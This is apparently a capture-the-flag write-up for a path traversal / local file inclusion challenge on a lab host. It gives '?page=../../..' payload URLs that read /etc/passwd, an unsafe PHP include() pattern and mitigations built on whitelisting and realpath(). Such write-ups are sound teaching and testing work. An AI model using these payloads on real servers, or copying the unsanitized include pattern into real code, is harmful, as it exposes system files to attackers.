# 📁 Flag: Traversal Directory — Path Traversal / Local File Inclusion (LFI)

## Vulnerability Type
**Path Traversal / Local File Inclusion (LFI)** — Unsanitized `?page` Parameter

## Description

While exploring the site, a `?page` parameter was spotted in the URL. This parameter is used by a PHP script to load page content dynamically. If the value is passed directly to a file-include function (like PHP's `include()` or `require()`) without sanitization, an attacker can **escape the web root** and read arbitrary files from the server's filesystem.

The classic target in CTFs and penetration tests is `/etc/passwd` — a world-readable file on Linux systems that proves filesystem access.

## Exploit

Web roots on Linux are typically located at `/var/www/html/`. To escape from there to the filesystem root `/`, we need to traverse several directories upward using `../` sequences.

Each `../` goes one directory level up. Trying progressively deeper traversal:

```
http://192.168.64.17/?page=../etc/passwd          → "wtf" (too shallow)
http://192.168.64.17/?page=../../etc/passwd        → still wrong
...
http://192.168.64.17/?page=../../../../../../../etc/passwd  → 🎉 FLAG
```

The server responds with encouraging messages as you get closer, and finally reveals the flag when the correct traversal depth is reached.

### Final Payload

```
http://192.168.64.17/?page=../../../../../../../etc/passwd
```

## How It Works

The PHP backend does something equivalent to:

```php
include($_GET['page'] . '.php');
```

Or reads a file based on the `page` parameter. Since the input is not validated or canonicalized, the `../` sequences are resolved by the OS, effectively walking up the directory tree until the filesystem root is reached, giving access to `/etc/passwd`.

## Mitigation

- **Never use user-supplied input directly in file paths**.
- Use a **whitelist** of allowed page names and map them to hardcoded file paths server-side.
- Apply `realpath()` (or equivalent) to canonicalize the path and verify it starts with the expected base directory:
  ```php
  $base = '/var/www/html/pages/';
  $path = realpath($base . $_GET['page'] . '.php');
  if (strpos($path, $base) !== 0) { die('Access denied'); }
  ```
- Disable PHP functions like `allow_url_include` and restrict the PHP process to the web root with filesystem permissions.
